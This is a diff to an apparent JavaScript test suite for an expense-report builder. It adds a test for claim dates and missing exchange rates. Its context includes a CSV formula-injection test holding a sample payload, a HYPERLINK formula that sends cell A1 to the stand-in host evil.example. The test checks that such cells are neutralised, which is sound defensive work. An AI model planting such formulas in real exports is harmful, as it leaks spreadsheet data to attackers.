@@ -73,6 +73,19 @@ describe('reports/expense-doc', () => {
 
 // A cell that starts with = + - @ is a formula to Excel, quoted or not, and
 // merchants and purposes come from receipts and from people.
+describe('reports/expense-doc — dates and missing rates', () => {
+  test('the claim is dated where the company is, and a line without a rate says so instead of printing 0.00', () => {
+    const p = { ...payload, report: { ...payload.report, claimedAt: '2026-09-30T23:30:00Z' },
+                lines: [...payload.lines, { ref: 'R4', date: '2026-09-03', merchant: 'Pending', category: 'Meals', currency: 'VND', amount: 500000, fxRate: null, baseAmount: null }] };
+    const m = doc.buildModel(p);
+    expect(m.notes.join(' ')).toMatch(/1 line has no exchange rate yet/);
+    expect(m.total).toBe(doc.buildModel(payload).total);
+    const text = JSON.stringify(doc.expenseReportDoc(p));
+    expect(text).toContain('Claimed 1 Oct 2026');
+    expect(text).toContain('rate pending');
+  });
+});
+
 describe('reports/expense-doc — CSV formula injection', () => {
   test('text that would be a formula is neutralised; numbers keep their sign', () => {
     const evil = { ...payload, lines: [{ ...payload.lines[3], merchant: '=HYPERLINK("https://evil.example/?x="&A1,"Click")', purpose: '@SUM(1+1)', description: '-cmd' }] };
